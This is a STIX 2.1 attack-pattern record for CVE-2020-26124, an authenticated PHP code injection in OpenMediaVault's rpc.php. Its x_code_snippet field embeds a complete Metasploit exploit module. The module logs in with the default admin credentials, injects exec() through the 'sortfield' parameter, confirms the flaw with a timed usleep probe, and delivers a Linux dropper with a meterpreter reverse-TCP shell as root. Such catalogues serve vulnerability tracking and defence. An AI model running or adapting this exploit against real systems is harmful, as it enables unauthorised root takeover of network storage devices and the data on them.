{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2169dec-2b71-497d-ad25-7043bc47fbfe",
    "created": "2024-08-14T17:12:53.170591Z",
    "modified": "2024-08-14T17:12:53.170594Z",
    "name": "OpenMediaVault rpc.php Authenticated PHP Code Injection",
    "description": " This module exploits an authenticated PHP code injection vulnerability found in openmediavault versions before 4.1.36 and 5.x versions before 5.5.12 inclusive in the \"sortfield\" POST parameter of the rpc.php page, because \"json_encode_safe()\" is not used in config/databasebackend.inc. Successful exploitation grants attackers the ability to execute arbitrary commands on the underlying operating system as root. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/openmediavault_rpc_rce.rb",
            "external_id": "openmediavault_rpc_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-26124"
        },
        {
            "source_name": "reference",
            "url": "https://www.openmediavault.org/?p=2797"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OpenMediaVault rpc.php Authenticated PHP Code Injection',\n        'Description' => %q{\n          This module exploits an authenticated PHP code injection\n          vulnerability found in openmediavault versions before 4.1.36\n          and 5.x versions before 5.5.12 inclusive in the \"sortfield\"\n          POST parameter of the rpc.php page, because \"json_encode_safe()\"\n          is not used in config/databasebackend.inc.\n          Successful exploitation grants attackers the ability to execute\n          arbitrary commands on the underlying operating system as root.\n        },\n        'Author' => [\n          'Anastasios Stasinopoulos' # @ancst of Obrela Labs Team - Discovery and Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2020-26124'],\n          ['URL', 'https://www.openmediavault.org/?p=2797']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Payload' => { 'BadChars' => \"\\x00\" },\n        'DisclosureDate' => '2020-09-28',\n        'Targets' => [\n          [\n            'Automatic (Linux Dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path of the OpenMediaVault installation', '/']),\n        OptString.new('USERNAME', [true, 'The OpenMediaVault username to authenticate with', 'admin']),\n        OptString.new('PASSWORD', [true, 'The OpenMediaVault password to authenticate with', 'openmediavault'])\n      ]\n    )\n  end\n\n  def user\n    datastore['USERNAME']\n  end\n\n  def pass\n    datastore['PASSWORD']\n  end\n\n  def login(user, pass, _opts = {})\n    print_status(\"#{peer} - Authenticating with OpenMediaVault using #{user}:#{pass}...\")\n    @uri = normalize_uri(target_uri.path, '/rpc.php')\n    res = send_request_cgi({\n      'uri' => @uri,\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'data' => {\n        service: 'Session',\n        method: 'login',\n        params: {\n          username: user.to_s,\n          password: pass.to_s\n        },\n        options: nil\n      }.to_json\n    })\n    unless res\n      # We return nil here, as callers should handle this case\n      # specifically with their own unique error message.\n      return nil\n    end\n\n    if res.code == 200 && res.body.scan('\"authenticated\":true,').flatten.first && res.get_cookies.scan(/X-OPENMEDIAVAULT-SESSIONID=(\\w+);*/).flatten.first\n      @cookie = res.get_cookies\n    end\n    return res\n  rescue ::Rex::ConnectionError\n    print_error('Rex::ConnectionError caught in login(), could not connect to the target.')\n    return nil\n  end\n\n  def get_target\n    print_status(\"#{peer} - Trying to detect if target is running a supported version of OpenMediaVault.\")\n    res = send_request_cgi({\n      'uri' => @uri,\n      'method' => 'POST',\n      'cookie' => @cookie.to_s,\n      'data' => {\n        service: 'System',\n        method: 'getInformation',\n        params: nil,\n        options: {\n          updatelastaccess: false\n        }\n      }.to_json\n    })\n    version = res.body.scan(/\"version\":\"(\\d.\\d.{0,1}\\d{0,1}.{0,1}\\d{0,1})/).flatten.first\n    if version.nil?\n      print_error(\"#{peer} - Unable to grab version of OpenMediaVault installed on target!\")\n      return nil\n    end\n    print_good(\"#{peer} - Identified OpenMediaVault version #{version}.\")\n\n    version_gemmed = Rex::Version.new(version)\n    if version_gemmed < Rex::Version.new('3.0.1')\n      return version\n    elsif version_gemmed >= Rex::Version.new('4.0.0') && version_gemmed < Rex::Version.new('4.1.36')\n      return version\n    elsif version_gemmed >= Rex::Version.new('5.0.0') && version_gemmed < Rex::Version.new('5.5.12')\n      return version\n    else\n      return nil\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    send_request_cgi({\n      'uri' => @uri,\n      'method' => 'POST',\n      'cookie' => @cookie.to_s,\n      'data' => {\n        service: 'LogFile',\n        method: 'getList',\n        params: {\n          id: 'apt_history',\n          start: 0,\n          limit: 50,\n          sortfield: \"'.exec(\\\"#{cmd}\\\").'\",\n          sortdir: 'DESC'\n        },\n        options: nil\n      }.to_json\n    })\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, 'Rex::ConnectionError caught in execute_command(), could not connect to the target.')\n  end\n\n  def check\n    res = login(user, pass)\n    unless res\n      return CheckCode::Unknown(\"No response was received from #{peer} whilst in check(), check it is online and the target port is open!\")\n    end\n\n    if @cookie.nil?\n      return Exploit::CheckCode::Unknown(\"Failed to authenticate with OpenMediaVault on #{peer} using #{user}:#{pass}\")\n    end\n\n    print_good(\"#{peer} - Successfully authenticated with OpenMediaVault using #{user}:#{pass}.\")\n    version = get_target\n    if version.nil?\n      # We don't print out an error message here as returning this will\n      # automatically cause Metasploit to print out an appropriate error message.\n      return CheckCode::Safe\n    end\n\n    delay = rand(7...15)\n    cmd = \"\\\").usleep(#{delay}0000).(\\\"\"\n    print_status(\"#{peer} - Verifying remote code execution by attempting to execute 'usleep()'.\")\n    t1 = Time.now.to_i\n    res = execute_command(cmd)\n    t2 = Time.now.to_i\n    unless res\n      print_error(\"#{peer} - Connection failed whilst trying to perform the code injection.\")\n      return CheckCode::Detected\n    end\n    diff = t2 - t1\n    if diff >= 3\n      print_good(\"#{peer} - Response received after #{diff} seconds.\")\n      return CheckCode::Vulnerable\n    end\n    print_error(\"#{peer} - Response wasn't received within the expected period of time.\")\n    return CheckCode::Safe\n  rescue ::Rex::ConnectionError\n    print_error(\"#{peer} - Rex::ConnectionError caught in check(), could not connect to the target.\")\n    return CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"#{peer} - Sending payload (#{payload.encoded.length} bytes)...\")\n    execute_cmdstager(linemax: 130_000)\n  rescue ::Rex::ConnectionError\n    print_error('Rex::ConnectionError caught in exploit(), could not connect to the target.')\n    return false\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-09-28",
    "x_mitre_platforms": [
        "linux'"
    ]
}